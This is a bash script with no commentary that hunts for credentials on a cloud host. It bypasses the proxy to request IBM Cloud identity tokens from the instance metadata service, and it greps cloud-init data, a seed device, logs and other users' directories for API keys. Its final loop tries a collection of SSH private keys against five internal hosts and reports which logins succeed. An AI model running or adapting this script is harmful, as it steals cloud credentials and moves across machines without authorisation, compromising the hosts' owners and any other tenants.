#!/bin/bash
set -u
S="sudo -n"; [ "$(id -u)" = "0" ] && S=""
echo "### HOST $(hostname) $(hostname -I)"
echo "=== PROXY ENV / PRELOAD ==="
env | grep -iE 'proxy|preload' ; echo "ldpreload_done"
echo "=== IMDS RETEST (noproxy, verbose) ==="
ip route get 169.254.169.254 2>&1 | head -2
timeout 5 curl -sv --noproxy '*' -m 4 http://169.254.169.254/ -o /tmp/i1 2>&1 | grep -E 'Connected|Failed|refused|timed|HTTP/' | head -5
for HV in ibm IBM IbM; do
  for BODY in '{"expires_in":3600}' ''; do
    r=$(timeout 8 curl -s --noproxy '*' -m 6 -X PUT -H "Metadata-Flavor: $HV" -H 'Content-Type: application/json' ${BODY:+-d "$BODY"} -o /tmp/t -w '%{http_code}/%{size_download}' http://169.254.169.254/instance_identity/v1/token)
    echo "TOK hv=$HV body=${BODY:-none} -> $r :: $(head -c 120 /tmp/t | tr -d '\n')"
  done
done
echo "=== TCP PROBE 169.254.169.254:80 ==="
timeout 4 bash -c 'echo > /dev/tcp/169.254.169.254/80' 2>&1 && echo TCP_OK || echo TCP_FAIL
echo "=== VENDOR-DATA / OBJ ==="
$S ls -la /var/lib/cloud/instance/ 2>/dev/null
$S head -c 3000 /var/lib/cloud/instance/vendor-data.txt 2>/dev/null | tr -d '\000'; echo
$S head -c 4000 /var/lib/cloud/instance/vendor-cloud-config.txt 2>/dev/null | tr -d '\000'; echo
$S strings /var/lib/cloud/instance/obj.pkl 2>/dev/null | grep -aiE 'apikey|api_key|token|ibmcloud|iaas\.cloud' | sort -u | head -20
echo "=== SEED DEVICE STRINGS ==="
$S strings /dev/vdb 2>/dev/null | grep -aiE 'apikey|api_key|IBMCLOUD|iaas\.cloud\.ibm|ic_api' | sort -u | head -20
echo "=== T19 LOG (full grep) ==="
$S grep -aiE 'apikey|api_key|token|iam|iaas|create|instance' /var/log/t19-cloud.log 2>/dev/null | tail -25
echo "=== OTHER LANE LEFTOVERS ==="
$S grep -rasohE '(apikey|api_key|API_KEY)[=: "'"'"']{1,4}[A-Za-z0-9_-]{40,60}' /opt/ul-t2 /opt/nv /tmp/ulrepo /tmp/ulpdo /tmp/ul2* /home/ubuntu 2>/dev/null | sort -u | head -10
$S ls /opt/nv | head -20
echo "=== KEY CORPUS SSH ==="
for K in $(ls keys2/* az/*.pem 2>/dev/null); do cp "$K" /tmp/kt; chmod 600 /tmp/kt
  for H in 10.243.0.24 10.243.0.26 10.243.0.27 10.243.0.30 10.243.0.31; do
    R=$(ssh -i /tmp/kt -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o BatchMode=yes -o ConnectTimeout=5 ubuntu@$H 'echo OK; hostname; nvidia-smi -L | head -2' 2>&1 | tr '\n' '|')
    case "$R" in *OK*) echo "SSHOK $K $H :: $R";; esac
  done
done
echo "R3_DONE"
